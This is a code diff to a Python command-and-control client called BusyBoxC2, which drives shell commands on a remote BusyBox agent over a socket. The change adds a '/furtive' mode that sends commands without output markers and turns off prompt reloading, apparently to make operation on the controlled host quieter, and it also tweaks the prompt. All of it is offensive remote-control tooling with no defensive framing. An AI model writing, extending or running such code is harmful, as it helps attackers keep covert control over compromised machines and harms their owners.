@@ -45,6 +45,11 @@ class BusyBoxC2:
 
     def _send_cmd(self, cmd, output=True):
 
+        # Furtive option (execute only without)
+        if "furtive" in self.options :
+            self.socket.sendall((cmd + "\n").encode())
+            return
+
         # Add marker to know when command execution is terminated
         marker = "M{}".format(int(time.time()*1000))
         full_cmd = cmd + " ; echo " + marker
@@ -174,7 +179,7 @@ class BusyBoxC2:
 
         #print(f"user: {agent_user} | hostname: {agent_hostname} | pwd: {agent_pwd}")
 
-        self.prompt = " (busybox-c2)[+] " + agent_user +  "@" + agent_hostname + ":" + agent_pwd + ">"
+        self.prompt = " (busybox-c2)[+] " + agent_user +  "@" + agent_hostname + ":" + agent_pwd + "> "
 
     def run(self):
         try:
@@ -209,6 +214,9 @@ class BusyBoxC2:
                         case '/load_prompt':
                             self.options.append('load_prompt')
                             self._load_prompt()
+                        case '/furtive':
+                            self.options.append('furtive')
+                            if "load_prompt" in self.options: self.options.remove("load_prompt")
                         case _:
                             self._send_cmd(cmd)
                             if "load_prompt" in self.options: self._load_prompt()
